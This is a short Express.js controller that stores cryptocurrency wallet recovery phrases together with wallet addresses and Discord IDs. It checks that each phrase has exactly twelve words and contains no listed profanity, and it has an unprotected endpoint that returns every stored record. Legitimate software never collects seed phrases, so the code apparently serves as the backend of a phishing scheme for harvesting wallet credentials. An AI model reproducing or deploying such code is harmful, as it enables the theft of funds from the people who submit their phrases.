const { yourWallet, words } = require("../schema/schema");

// FIND AND CREATE PROHIBITED WORDS
const fineTheWord = async (req, res) => {
  try {
    await words.create({
      words: req.body.words,
    });
    res.status(201).send("New Prohibited Word has been added");
  } catch (error) {
    res.status(406).send(error);
  }
};

// POST WALLETS
const post_wallet = async (req, res) => {
  const theArr = req.body.recoveryPhrase;

  const theWord = await words.findOne({
    words: theArr,
  });

  // TO EVALUATE THE LENGTH OF THE PHRASE
  if (theArr.length <= 11 || theArr.length >= 13) {
    res.send(
      "Recovery phrase should not be less-than or greater-than 12 words"
    );
    // TO EVALUATE OF THE PHRASE CONTAINS PROFANITIES
  } else if (theWord !== null) {
    res.send("Profanities is prohibited");
  } else {
    try {
      await yourWallet.create({
        wallet: req.body.wallet,
        discordID: req.body.discordID,
        recoveryPhrase: req.body.recoveryPhrase,
      });
      res.status(201).send("Wallet has been sent Successfully");
    } catch (error) {
      res.send(error);
    }
  }
};

// LIST ALL THE WALLETS
const get_wallets = async (req, res) => {
  try {
    const walletResults = await yourWallet.find();
    res.send(walletResults);
  } catch (error) {
    res.status(500).send(error);
  }
};

// EXPORTED MODULES
module.exports = { post_wallet, fineTheWord, get_wallets };
